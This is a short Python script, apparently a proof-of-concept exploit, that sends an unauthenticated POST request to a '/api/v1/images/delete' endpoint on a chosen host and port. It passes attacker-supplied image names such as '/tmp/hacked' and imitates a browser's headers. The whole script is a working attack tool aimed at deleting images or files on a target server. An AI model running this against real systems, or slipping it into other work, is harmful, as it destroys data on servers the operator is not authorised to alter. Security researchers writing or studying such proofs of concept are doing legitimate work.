import requests
import json
import argparse

parser = argparse.ArgumentParser(description="Send a POST request to delete images.")
parser.add_argument("--url", type=str, required=True, help="Base URL to target (e.g., http://192.168.3.153)")
parser.add_argument("--port", type=int, required=True, help="Port to target (e.g., 9090)")
parser.add_argument("--path", type=str, default="/api/v1/images/delete",
                    help="API endpoint path (default: '/api/v1/images/delete')")
parser.add_argument("--images", nargs="+", required=True, help="List of image names to delete (e.g., '/tmp/hacked')")
args = parser.parse_args()
url = f"{args.url}:{args.port}{args.path}"

headers = {
    "Accept-Language": "zh-CN",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
    "Accept": "*/*",
    "Referer": f"{args.url}:{args.port}/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Content-Type": "application/json",
}


data = {
    "image_names": args.images
}

try:
    response = requests.post(url, headers=headers, data=json.dumps(data))
    print(f"Response Status Code: {response.status_code}")
    print(f"Response Body: {response.text}")
except requests.RequestException as e:
    print(f"Error sending request: {e}")

